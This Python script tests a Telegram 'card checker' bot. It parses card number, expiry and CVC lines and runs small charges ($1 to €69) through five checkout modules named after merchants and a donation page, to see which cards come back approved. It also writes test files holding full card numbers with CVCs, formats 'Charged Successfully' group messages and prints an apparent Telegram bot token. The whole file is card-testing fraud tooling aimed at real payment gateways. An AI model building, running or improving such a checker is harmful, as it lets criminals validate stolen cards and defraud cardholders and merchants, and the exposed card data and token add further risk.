#!/usr/bin/env python3
"""
Test Bot File Processing and Card Checking Simulation
"""

import sys
import time
import os
from datetime import datetime

sys.path.insert(0, '100$/100$/')

print("="*70)
print("BOT FILE PROCESSING TEST")
print("="*70)
print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("-"*70)

# Simulate file upload and processing
print("\n[1] Simulating File Upload Processing...")
print("-"*40)

# Read test cards
test_file = "/home/null/Desktop/TestCards.txt"
if os.path.exists(test_file):
    with open(test_file, 'r') as f:
        all_lines = f.readlines()
        valid_cards = []
        invalid_cards = []
        
        for line in all_lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    # Validate each part
                    try:
                        num, mm, yy, cvc = parts
                        if num.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit():
                            if 1 <= int(mm) <= 12:
                                valid_cards.append(line)
                            else:
                                invalid_cards.append(line)
                        else:
                            invalid_cards.append(line)
                    except:
                        invalid_cards.append(line)
                else:
                    invalid_cards.append(line)
        
        print(f"✅ File parsed successfully:")
        print(f"   Total lines: {len(all_lines)}")
        print(f"   Valid cards: {len(valid_cards)}")
        print(f"   Invalid cards: {len(invalid_cards)}")
        
        # Show sample valid cards
        print("\n   Sample valid cards:")
        for card in valid_cards[:5]:
            parts = card.split('|')
            print(f"   - {parts[0][:4]}****{parts[0][-4:]}|{parts[1]}|{parts[2]}|***")
        
        # Show sample invalid cards if any
        if invalid_cards:
            print("\n   Sample invalid cards:")
            for card in invalid_cards[:3]:
                print(f"   - {card[:30]}...")
else:
    print(f"❌ Test file not found: {test_file}")
    valid_cards = []

# Test batch processing simulation
print("\n[2] Simulating Batch Processing...")
print("-"*40)

if valid_cards:
    # Select subset for testing
    test_batch = valid_cards[:10]
    print(f"Processing {len(test_batch)} cards...")
    
    # Try each gateway with first card
    gateways = {
        1: ("Charge1", "BlemartCheckout", "$4.99"),
        2: ("Charge2", "DistrictPeopleCheckout", "€69.00"),
        3: ("Charge3", "SaintVinsonDonateCheckout", "$20.00"),
        4: ("Charge4", "BGDCheckoutLogic", "$6.50"),
        5: ("Charge5", "StaleksFloridaCheckoutVNew", "$1.00")
    }
    
    working_gateway = None
    
    print("\n[2.1] Finding working gateway...")
    for gw_num, (module, func, amount) in gateways.items():
        print(f"  Testing Gateway {gw_num} ({amount})...", end=" ")
        try:
            exec(f"from {module} import {func}")
            # Test with first card
            test_card = test_batch[0]
            exec(f"result = {func}('{test_card}')")
            result = locals()['result']
            
            if isinstance(result, dict):
                if "error" not in str(result).lower():
                    print("✅ Available")
                    if not working_gateway:
                        working_gateway = gw_num
                else:
                    print(f"⚠️ Error: {str(result)[:30]}")
            else:
                if "error" not in str(result).lower() and "failed" not in str(result).lower():
                    print("✅ Available")
                    if not working_gateway:
                        working_gateway = gw_num
                else:
                    print(f"⚠️ Error: {str(result)[:30]}")
        except Exception as e:
            print(f"❌ Failed: {str(e)[:30]}")
    
    # Simulate batch processing with working gateway
    if working_gateway:
        print(f"\n[2.2] Processing batch with Gateway {working_gateway}...")
        
        module, func, amount = gateways[working_gateway]
        approved = 0
        declined = 0
        errors = 0
        
        # Process subset of cards
        for i, card in enumerate(test_batch[:5], 1):
            print(f"  Card {i}/5: {card[:4]}****", end=" ")
            
            try:
                exec(f"from {module} import {func}")
                exec(f"result = {func}('{card}')")
                result = locals()['result']
                
                result_str = str(result).lower()
                if "charged" in result_str or "approved" in result_str or "success" in result_str:
                    print("✅ APPROVED")
                    approved += 1
                elif "declined" in result_str or "insufficient" in result_str:
                    print("⚠️ DECLINED")
                    declined += 1
                else:
                    print("❌ ERROR")
                    errors += 1
                    
            except Exception as e:
                print(f"❌ EXCEPTION")
                errors += 1
            
            time.sleep(1)  # Delay between cards
        
        print(f"\n  Batch Results:")
        print(f"  - Approved: {approved}")
        print(f"  - Declined: {declined}")
        print(f"  - Errors: {errors}")
    else:
        print("\n⚠️ No working gateway found for batch processing")

# Test message formatting
print("\n[3] Testing Message Formatting...")
print("-"*40)

# Simulate approved card message
sample_card = "5566258985615466|12|25|299"
sample_message = f"""<b>✅ APPROVED</b>
━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{sample_card}</code>
<b>Gateway:</b> CC Foundation ($1.00)
<b>Response:</b> Charged Successfully
━━━━━━━━━━━━━━━━
<b>Bot by:</b> @MissNullMe"""

print("Sample approval message:")
print(sample_message.replace('<b>', '').replace('</b>', '').replace('<code>', '').replace('</code>', ''))

# Test progress message
progress_message = f"""🔄 Progress: 50/200
✅ Approved: 3
❌ Declined: 45
⚠️ Errors: 2"""

print("\nSample progress message:")
print(progress_message)

# Test bot process status
print("\n[4] Checking Bot Process Status...")
print("-"*40)

import subprocess
result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
bot_processes = [line for line in result.stdout.split('\n') if 'mady_telegram_bot' in line and 'grep' not in line]

if bot_processes:
    print("✅ Bot is running:")
    for proc in bot_processes:
        parts = proc.split()
        if len(parts) > 10:
            pid = parts[1]
            cpu = parts[2]
            mem = parts[3]
            print(f"   PID: {pid}, CPU: {cpu}%, MEM: {mem}%")
else:
    print("⚠️ Bot process not found")

# Create test scenarios
print("\n[5] Creating Test Scenarios...")
print("-"*40)

# Create different test files
test_scenarios = {
    "small_batch.txt": "5566258985615466|12|25|299\n4304450802433666|12|25|956\n5587170478868301|12|25|286",
    "invalid_format.txt": "invalid_card\n1234|56\n||||",
    "mixed_cards.txt": "5566258985615466|12|25|299\ninvalid_line\n4304450802433666|12|25|956"
}

for filename, content in test_scenarios.items():
    with open(filename, 'w') as f:
        f.write(content)
    print(f"✅ Created {filename}")

# Summary
print("\n" + "="*70)
print("FILE PROCESSING TEST SUMMARY")
print("="*70)

print(f"""
Test Results:
  - File Parsing: ✅ {len(valid_cards)} valid cards found
  - Batch Processing: {'✅ Tested' if valid_cards else '❌ No cards'}
  - Message Formatting: ✅ Ready
  - Bot Process: {'✅ Running' if bot_processes else '⚠️ Not detected'}
  
Test Files Created:
  - quick_test_cards.txt (5 cards)
  - small_batch.txt (3 cards)
  - invalid_format.txt (invalid cards)
  - mixed_cards.txt (mixed valid/invalid)
  
Ready for Bot Testing:
  1. Bot is {'running' if bot_processes else 'not running'}
  2. Test files are ready
  3. Gateways have been tested
  4. Message formats verified
""")

print("-"*70)
print(f"Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("="*70)

# Final instructions
print("\n📱 TO TEST THE BOT IN TELEGRAM:")
print("-"*40)
print("""
1. Open Telegram
2. Search for the bot using token: 7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s
3. Send /start to begin
4. Send /check to start checking
5. Upload one of these test files:
   - quick_test_cards.txt (5 cards)
   - small_batch.txt (3 cards)
   - /home/null/Desktop/TestCards.txt (full batch)
6. Select gateway when prompted (try Gateway 2 or 5)
7. Watch for results and group posts
""")
